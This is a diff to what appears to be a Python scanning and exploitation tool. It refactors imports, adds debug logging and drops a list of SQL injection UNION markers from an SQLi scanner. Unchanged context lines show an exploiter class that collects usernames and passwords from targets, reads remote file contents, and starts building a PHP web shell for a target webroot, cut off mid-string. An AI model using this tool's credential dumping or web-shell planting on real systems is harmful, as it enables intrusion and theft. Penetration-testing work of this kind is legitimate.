@@ -180,15 +180,6 @@ class SQLInjectionScanner(BaseScanner):
         p = payload.upper()
         return "UNION" in p and "SELECT" in p
 
-    # Union-based: responses that echo column values from UNION SELECT
-    _UNION_MARKERS = [
-        "wsunion1337",
-        "WSUNION_MARKER",
-        "@@version",
-        "user()",
-        "database()",
-    ]
-
     # Max columns to try for UNION-based probing
     _UNION_MAX_COLS = 10
 
@@ -1924,8 +1915,7 @@ class SQLiExploiter:
     ]
 
     def __init__(self, session=None, timeout: int = 120):
-        import requests as _req
-        self.session = session or _req.Session()
+        self.session = session or _requests.Session()
         self.timeout = timeout
 
     @staticmethod
@@ -2019,7 +2009,8 @@ class SQLiExploiter:
                         "password": pwd.strip(),
                         "url": url,
                     })
-            except Exception:
+            except Exception as _fix_e:
+                logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
                 continue
 
         return results
@@ -2091,9 +2082,8 @@ class SQLiExploiter:
         except Exception as e:
             return {"success": False, "error": str(e)}
         finally:
-            import shutil as _sh
             try:
-                _sh.rmtree(out_dir)
+                shutil.rmtree(out_dir)
             except Exception as _fix_e:
                 logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
 
@@ -2128,7 +2118,8 @@ class SQLiExploiter:
                     pos = min(p for p in positions if p >= 0)
                     excerpt = r.text[max(0, pos - 50): min(len(r.text), pos + 1000)]
                     results[fpath] = excerpt.strip()
-            except Exception:
+            except Exception as _fix_e:
+                logger.debug(f"[scanners.sqli] {type(_fix_e).__name__}: {_fix_e!r}")
                 continue
 
         return results
@@ -2147,9 +2138,8 @@ class SQLiExploiter:
         otherwise None.
         """
         import hashlib
-        import time as _time
 
-        shell_name = f"ws_{hashlib.md5(str(_time.time()).encode()).hexdigest()[:8]}.php"
+        shell_name = f"ws_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.php"
         shell_path = f"{webroot.rstrip('/')}/{shell_name}"
         shell_content = (
             "<?php if(isset($_GET['c'])){"
